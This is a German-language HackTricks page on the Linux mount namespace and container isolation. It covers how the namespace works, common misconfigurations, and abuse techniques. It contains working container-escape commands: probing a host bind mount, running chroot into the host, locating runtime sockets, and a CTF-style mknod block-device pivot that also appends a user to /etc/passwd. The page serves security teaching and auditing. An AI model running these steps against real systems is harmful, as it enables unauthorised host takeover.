# Mount-Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Überblick

Der Mount-Namespace steuert die **Mount-Tabelle**, die ein Prozess sieht. Dies ist eine der wichtigsten Funktionen zur Container-Isolation, da das Root-Dateisystem, Bind-Mounts, tmpfs-Mounts, die procfs-Ansicht, die sysfs-Exponierung und viele runtime-spezifische Hilfs-Mounts alle über diese Mount-Tabelle ausgedrückt werden. Zwei Prozesse können beide auf `/`, `/proc`, `/sys` oder `/tmp` zugreifen, aber worauf diese Pfade verweisen, hängt vom Mount-Namespace ab, in dem sie sich befinden.

Aus Sicht der Container-Sicherheit ist der Mount-Namespace oft der Unterschied zwischen „dies ist ein sauber vorbereitetes Application-Dateisystem“ und „dieser Prozess kann das Host-Dateisystem direkt sehen oder beeinflussen“. Deshalb drehen sich Bind-Mounts, `hostPath`-Volumes, privilegierte Mount-Operationen sowie beschreibbare `/proc`- oder `/sys`-Exponierungen alle um diesen Namespace.

## Funktionsweise

Wenn eine runtime einen Container startet, erstellt sie normalerweise einen neuen Mount-Namespace, bereitet ein Root-Dateisystem für den Container vor, mountet procfs und andere benötigte Hilfs-Dateisysteme und fügt anschließend optional Bind-Mounts, tmpfs-Mounts, Secrets, ConfigMaps oder Host-Pfade hinzu. Sobald der Prozess innerhalb des Namespace läuft, ist die Menge der von ihm gesehenen Mounts weitgehend von der standardmäßigen Ansicht des Hosts entkoppelt. Der Host kann weiterhin das tatsächlich zugrunde liegende Dateisystem sehen, aber der Container sieht die von der runtime für ihn zusammengestellte Version.

Dies ist leistungsfähig, weil der Container dadurch glauben kann, über ein eigenes Root-Dateisystem zu verfügen, obwohl der Host weiterhin alles verwaltet. Es ist jedoch auch gefährlich, denn wenn die runtime den falschen Mount exponiert, erhält der Prozess plötzlich Sichtbarkeit auf Host-Ressourcen, vor denen das restliche Sicherheitsmodell möglicherweise nicht schützen sollte.

## Lab

Du kannst einen privaten Mount-Namespace erstellen mit:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Wenn du eine weitere Shell außerhalb dieses Namespace öffnest und die Mount-Tabelle überprüfst, wirst du sehen, dass der tmpfs-Mount nur innerhalb des isolierten Mount-Namespace existiert. Diese Übung ist nützlich, weil sie zeigt, dass Mount-Isolation keine abstrakte Theorie ist; der Kernel präsentiert dem Prozess tatsächlich eine andere Mount-Tabelle.

Wenn du eine weitere Shell außerhalb dieses Namespace öffnest und die Mount-Tabelle überprüfst, wird der tmpfs-Mount nur innerhalb des isolierten Mount-Namespace existieren.

Innerhalb von Containern ist ein schneller Vergleich:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
Das zweite Beispiel zeigt, wie einfach eine Runtime-Konfiguration eine enorme Lücke durch die Dateisystemgrenze schlagen kann.

## Runtime-Nutzung

Docker, Podman, containerd-basierte Stacks und CRI-O verlassen sich bei normalen Containern auf einen privaten Mount-Namespace. Kubernetes baut für Volumes, projizierte Secrets, Config Maps und `hostPath`-Mounts auf demselben Mechanismus auf. Auch Incus/LXC-Umgebungen verlassen sich stark auf Mount-Namespaces, insbesondere weil System-Container häufig umfangreichere und stärker einer Maschine ähnelnde Dateisysteme bereitstellen als Application-Container.

Das bedeutet: Wenn du ein Problem mit dem Container-Dateisystem untersuchst, handelt es sich normalerweise nicht um eine isolierte Docker-Eigenheit. Du untersuchst ein Problem mit Mount-Namespace und Runtime-Konfiguration, das durch die Plattform zum Ausdruck kommt, die den Workload gestartet hat.

## Fehlkonfigurationen

Der offensichtlichste und gefährlichste Fehler besteht darin, das Root-Dateisystem des Hosts oder einen anderen sensiblen Host-Pfad über einen Bind-Mount freizugeben, zum Beispiel `-v /:/host` oder einen beschreibbaren `hostPath` in Kubernetes. Ab diesem Punkt lautet die Frage nicht mehr: „Kann der Container irgendwie entkommen?“, sondern vielmehr: „Wie viele nützliche Host-Inhalte sind bereits direkt sichtbar und beschreibbar?“ Ein beschreibbarer Host-Bind-Mount verwandelt den Rest des Exploits häufig in eine einfache Angelegenheit aus Dateiablage, chrooting, Konfigurationsänderung oder der Suche nach Runtime-Sockets.

Ein weiteres häufiges Problem ist die Freigabe von `/proc` oder `/sys` des Hosts auf eine Weise, die die sicherere Container-Ansicht umgeht. Diese Dateisysteme sind keine gewöhnlichen Daten-Mounts, sondern Schnittstellen zum Kernel- und Prozessstatus. Wenn der Workload direkt auf die Host-Versionen zugreifen kann, gelten viele der Annahmen hinter dem Container-Hardening nicht mehr zuverlässig.

Auch Read-only-Schutzmaßnahmen sind wichtig. Ein Read-only-Root-Dateisystem macht einen Container nicht automatisch sicher, entfernt jedoch einen großen Teil des verfügbaren Staging-Speicherplatzes für Angreifer und erschwert Persistence, das Platzieren von Helper-Binaries sowie das Manipulieren von Konfigurationen. Umgekehrt bietet ein beschreibbares Root-Dateisystem oder ein beschreibbarer Host-Bind-Mount einem Angreifer Raum, um den nächsten Schritt vorzubereiten.

## Missbrauch

Wenn der Mount-Namespace missbraucht wird, tun Angreifer üblicherweise eines von vier Dingen. Sie **lesen Host-Daten**, die außerhalb des Containers hätten bleiben sollen. Sie **ändern die Host-Konfiguration** über beschreibbare Bind-Mounts. Sie **mounten oder remounten zusätzliche Ressourcen**, wenn Capabilities und seccomp dies erlauben. Oder sie **greifen auf privilegierte Sockets und Runtime-Statusverzeichnisse zu**, über die sie die Container-Plattform selbst um weiteren Zugriff bitten können.

Wenn der Container das Host-Dateisystem bereits sehen kann, ändert sich das gesamte Sicherheitsmodell sofort.

Wenn du einen Host-Bind-Mount vermutest, bestätige zunächst, was verfügbar und ob es beschreibbar ist:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Wenn das Root-Dateisystem des Hosts mit Schreibzugriff eingehängt ist, ist der direkte Zugriff auf den Host oft so einfach wie:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Wenn das Ziel privilegierter Laufzeitzugriff statt direktem chrooting ist, liste Sockets und den Laufzeitstatus auf:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Wenn `CAP_SYS_ADMIN` vorhanden ist, testen Sie außerdem, ob innerhalb des Containers neue Mounts erstellt werden können:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Vollständiges Beispiel: Zwei-Shell-`mknod`-Pivot

Ein spezialisierterer Missbrauchspfad ergibt sich, wenn der root-Benutzer im Container Blockgeräte erstellen kann, Host und Container eine auf nützliche Weise gemeinsame Benutzeridentität haben und der Angreifer bereits über einen Zugang mit niedrigen Privilegien auf dem Host verfügt. In dieser Situation kann der Container einen Gerätedevice wie `/dev/sda` erstellen, und der Benutzer mit niedrigen Privilegien auf dem Host kann ihn später über `/proc/<pid>/root/` für den entsprechenden Containerprozess lesen.

Im Container:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Vom Host aus, als passender Benutzer mit niedrigen Rechten, nachdem die PID der Container-Shell ermittelt wurde:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
Die wichtige Erkenntnis ist nicht die exakte Suche nach dem CTF-String. Entscheidend ist, dass die Offenlegung des Mount-Namespace über `/proc/<pid>/root/` es einem Host-Benutzer ermöglichen kann, von einem Container erstellte Device Nodes wiederzuverwenden, selbst wenn die cgroup-Geräterichtlinie die direkte Verwendung innerhalb des Containers verhindert hat.

## Checks

Diese Befehle sollen dir die Dateisystemansicht zeigen, in der der aktuelle Prozess tatsächlich läuft. Ziel ist es, vom Host abgeleitete Mounts, beschreibbare sensible Pfade und alles zu erkennen, was umfassender als das Root-Dateisystem eines normalen Application-Containers wirkt.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Was ist hier interessant:

- Bind-Mounts vom Host, insbesondere `/`, `/proc`, `/sys`, Verzeichnisse mit Laufzeitstatus oder Socket-Speicherorte, sollten sofort auffallen.
- Unerwartete Read-Write-Mounts sind in der Regel wichtiger als eine große Anzahl schreibgeschützter Hilfs-Mounts.
- `mountinfo` ist oft die beste Stelle, um festzustellen, ob ein Pfad tatsächlich vom Host stammt oder von einem Overlay unterstützt wird.

Diese Prüfungen zeigen, **welche Ressourcen in diesem Namespace sichtbar sind**, **welche davon vom Host stammen** und **welche davon beschreibbar oder sicherheitsrelevant sind**.
{{#include ../../../../../banners/hacktricks-training.md}}
